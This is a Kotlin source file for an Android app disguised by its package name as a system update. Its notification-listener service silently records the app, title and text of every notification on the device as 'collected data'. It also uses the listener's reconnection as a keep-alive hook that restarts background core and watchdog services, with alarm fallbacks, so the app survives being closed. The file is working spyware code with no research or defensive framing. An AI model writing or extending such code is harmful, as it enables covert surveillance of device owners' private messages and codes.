package com.androidsystem.update.service

import android.content.Intent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.androidsystem.update.database.DataRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import org.json.JSONObject
import javax.inject.Inject

@AndroidEntryPoint
class NotificationListener : NotificationListenerService() {

    @Inject lateinit var repository: DataRepository

    override fun onListenerConnected() {
        super.onListenerConnected()
        // Keep-alive hook: the system keeps an enabled notification-listener
        // service bound and reconnects it after the process dies (swipe-away,
        // low-memory kill, reboot once unlocked). Re-arm the background chain
        // from here, mirroring the accessibility keep-alive.
        try {
            startService(Intent(this, CoreService::class.java))
            startService(Intent(this, WatchdogService::class.java))
        } catch (e: Exception) {
            Log.e("NotificationListener", "Keep-alive direct start blocked, using alarm", e)
            WatchdogService.scheduleAlarmStart(this, CoreService::class.java, 1000L)
            WatchdogService.scheduleAlarmStart(this, WatchdogService::class.java, 2000L)
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn ?: return
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope.launch {
            try {
                repository.insertCollectedData("notification", JSONObject().apply {
                    put("package", sbn.packageName)
                    put("title", sbn.notification.extras.getString("android.title") ?: "")
                    put("text", sbn.notification.extras.getCharSequence("android.text")?.toString() ?: "")
                    put("timestamp", System.currentTimeMillis())
                }.toString())
            } finally {
                scope.cancel()
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}
